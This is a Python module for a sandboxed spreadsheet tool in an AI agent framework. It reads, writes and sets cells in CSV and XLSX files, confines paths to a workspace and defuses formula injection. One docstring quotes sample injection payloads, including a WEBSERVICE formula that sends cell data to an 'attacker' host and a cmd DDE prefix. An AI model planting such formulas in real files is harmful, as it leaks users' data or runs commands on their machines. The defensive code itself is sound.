"""Spreadsheet tool: read / write / edit CSV + XLSX.

Complements ``pandas_query`` (which *analyzes* tabular data read-only) with a
*write*-capable tool: create sheets, write rows, set individual cells. CSV uses
the stdlib; XLSX uses openpyxl (an optional extra — ops on .xlsx fail with an
actionable "install" message when it's absent, mirroring the other optional-dep
tools). ops: info, read, write, set_cell.
"""
from __future__ import annotations

import csv as _csv
import os
import stat
import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Any

from . import Tool

_SPREADSHEET_SCHEMA = {
    "type": "object",
    "properties": {
        "op": {"type": "string", "enum": ["info", "read", "write", "set_cell"]},
        "path": {"type": "string", "description": "path to a .csv or .xlsx file"},
        "rows": {"type": "array", "description": "rows (list of lists) for write",
                 "items": {"type": "array"}},
        "sheet": {"type": "string", "description": "sheet name (xlsx; default: first/active)"},
        "cell": {"type": "string", "description": "A1-style cell for set_cell, e.g. 'B2'"},
        "value": {"description": "value for set_cell"},
        "limit": {"type": "integer", "default": 50, "minimum": 1, "maximum": 10000},
    },
    "required": ["op", "path"],
}


def _is_xlsx(path: Path) -> bool:
    return path.suffix.lower() in (".xlsx", ".xlsm")


def _openpyxl():
    try:
        import openpyxl  # noqa: F401
        return openpyxl
    except ImportError as e:
        raise RuntimeError(
            "openpyxl not installed; .xlsx support needs it. "
            "Run: python -m pip install -e './packages/maverick-core[spreadsheet]'") from e


def _safe_path(sandbox, user_path: str) -> Path:
    """Resolve ``user_path`` confined to ``sandbox.workdir`` when available.

    Spreadsheet operations read and write files, so model-supplied paths must
    use the same workspace confinement as filesystem-like tools whenever the
    default registry wires a sandbox into this tool. Without a sandbox, preserve
    direct-path behavior for standalone/unit use.
    """
    if sandbox is None:
        return Path(user_path).expanduser()
    workdir = Path(sandbox.workdir).resolve()
    candidate = Path(user_path)
    candidate = (
        candidate.resolve()
        if candidate.is_absolute()
        else (workdir / candidate).resolve()
    )
    try:
        candidate.relative_to(workdir)
    except ValueError as e:
        raise ValueError(
            f"path {user_path!r} escapes the workspace"
        ) from e
    return candidate


# Characters a spreadsheet app treats as an executable/control cell prefix.
_FORMULA_OPERATORS = ("=", "+", "-", "@")
_FORMULA_TRIGGERS = (*_FORMULA_OPERATORS, "\t", "\r", "\n")


def _neutralize_formula(value: Any) -> Any:
    """Defang a CSV/XLSX formula-injection cell.

    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB,
    CR, or LF is executed as a formula when the file is opened in Excel / Sheets
    (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
    ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
    literal text. Non-string cells (numbers) are left untouched.
    """
    if isinstance(value, str):
        first = value[:1]
        first_non_whitespace = value.lstrip()[:1]
        if (
            first in _FORMULA_TRIGGERS
            or first_non_whitespace in _FORMULA_OPERATORS
        ):
            # Prefix at byte zero. Keeping whitespace before the apostrophe can
            # still let Excel/Sheets treat TAB/CR/LF as a control prefix.
            return "'" + value
    return value


# ---- CSV --------------------------------------------------------------------

def _csv_read(path: Path, limit: int) -> list[list]:
    with path.open(newline="", encoding="utf-8-sig") as f:
        return [row for _, row in zip(range(limit), _csv.reader(f), strict=False)]


@contextmanager
def _atomic_destination(path: Path):
    """Publish only a completed file; failed saves leave the original intact."""
    path.parent.mkdir(parents=True, exist_ok=True)
    previous_mode = stat.S_IMODE(path.stat().st_mode) if path.exists() else None
    fd, name = tempfile.mkstemp(prefix=".lightwork-sheet-", suffix=path.suffix, dir=path.parent)
    os.close(fd)
    temporary = Path(name)
    try:
        yield temporary
        if previous_mode is not None:
            os.chmod(temporary, previous_mode)
        os.replace(temporary, path)
    finally:
        if temporary.exists():
            # A failed Windows replace can leave our staged file read-only.
            # Change only that owned temporary file, never the original.
            os.chmod(temporary, stat.S_IREAD | stat.S_IWRITE)
            temporary.unlink()


def _csv_write(path: Path, rows: list[list]) -> None:
    with _atomic_destination(path) as temporary:
        with temporary.open("w", newline="", encoding="utf-8") as f:
            _csv.writer(f).writerows(
                [_neutralize_formula(c) for c in row] for row in rows
            )


# ---- XLSX -------------------------------------------------------------------

def _xlsx_read(path: Path, sheet: str | None, limit: int) -> list[list]:
    wb = _openpyxl().load_workbook(path, read_only=True, data_only=True)
    try:
        ws = wb[sheet] if sheet else wb.active
        return [list(row) for _, row in zip(range(limit), ws.iter_rows(values_only=True), strict=False)]
    finally:
        wb.close()


def _xlsx_write(path: Path, rows: list[list], sheet: str | None) -> None:
    op = _openpyxl()
    path.parent.mkdir(parents=True, exist_ok=True)
    wb = op.Workbook()
    try:
        ws = wb.active
        if sheet:
            ws.title = sheet
        for row in rows:
            ws.append([_neutralize_formula(c) for c in row])
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


def _xlsx_set_cell(path: Path, cell: str, value: Any, sheet: str | None) -> None:
    op = _openpyxl()
    existing = path.exists()
    wb = op.load_workbook(path) if existing else op.Workbook()
    try:
        if sheet and sheet in wb.sheetnames:
            ws = wb[sheet]
        elif sheet and existing:
            # Preserve other sheets and their cross-sheet references.
            ws = wb.create_sheet(sheet)
        else:
            ws = wb.active
            if sheet:
                ws.title = sheet
        ws[cell] = _neutralize_formula(value)
        with _atomic_destination(path) as temporary:
            wb.save(temporary)
    finally:
        wb.close()


# ---- dispatch ---------------------------------------------------------------

def _run(args: dict[str, Any], sandbox=None) -> str:
    op = args.get("op")
    raw_path = str(args.get("path") or "")
    if not op:
        return "ERROR: op is required"
    if not raw_path:
        return "ERROR: path is required"
    try:
        path = _safe_path(sandbox, raw_path)
    except ValueError as e:
        return f"ERROR: {e}"
    limit = args.get("limit", 50)
    if type(limit) is not int or not 1 <= limit <= 10000:
        return "ERROR: limit must be an integer between 1 and 10000"
    sheet = args.get("sheet")
    if path.suffix.lower() == ".xlsm" and op in ("write", "set_cell"):
        return "ERROR: editing .xlsm is unsupported because it can remove macros; use a reviewed .xlsx copy"
    try:
        if op == "info":
            if not path.exists():
                return f"ERROR: no such file {path}"
            if _is_xlsx(path):
                wb = _openpyxl().load_workbook(path, read_only=True)
                try:
                    dims = {s: (wb[s].max_row, wb[s].max_column) for s in wb.sheetnames}
                    return f"xlsx sheets {dims}"
                finally:
                    wb.close()
            rows = _csv_read(path, 10_001)
            if len(rows) > 10_000:
                return f"csv rows=10001+ cols={len(rows[0])} (at least 10001 rows; count limited)"
            return f"csv rows={len(rows)} cols={len(rows[0]) if rows else 0}"
        if op == "read":
            if not path.exists():
                return f"ERROR: no such file {path}"
            rows = _xlsx_read(path, sheet, limit) if _is_xlsx(path) else _csv_read(path, limit)
            import json
            return json.dumps(rows, default=str)
        if op == "write":
            rows = args.get("rows")
            if not isinstance(rows, list) or any(not isinstance(row, list) for row in rows):
                return "ERROR: write requires rows (list of lists)"
            norm = [list(r) for r in rows]
            if _is_xlsx(path):
                _xlsx_write(path, norm, sheet)
            else:
                _csv_write(path, norm)
            return f"wrote {len(rows)} row(s) to {path}"
        if op == "set_cell":
            if not _is_xlsx(path):
                return "ERROR: set_cell is xlsx-only; use write for csv"
            cell = str(args.get("cell") or "").strip()
            if not cell:
                return "ERROR: set_cell requires cell (e.g. 'B2')"
            _xlsx_set_cell(path, cell, args.get("value"), sheet)
            return f"set {cell} in {path}"
    except RuntimeError as e:
        return f"ERROR: {e}"
    except Exception as e:  # noqa: BLE001
        return f"ERROR: spreadsheet {op} failed: {type(e).__name__}: {e}"
    return f"ERROR: unknown op {op!r}"


def spreadsheet(sandbox=None) -> Tool:
    return Tool(
        name="spreadsheet",
        description=(
            "Read / write / edit CSV + XLSX spreadsheets. ops: info (sheets + "
            "dims), read (rows as JSON), write (rows -> file), set_cell (xlsx "
            "A1-cell). Complements pandas_query (read-only analysis) with writes."
        ),
        input_schema=_SPREADSHEET_SCHEMA,
        fn=lambda args: _run(args, sandbox),
    )
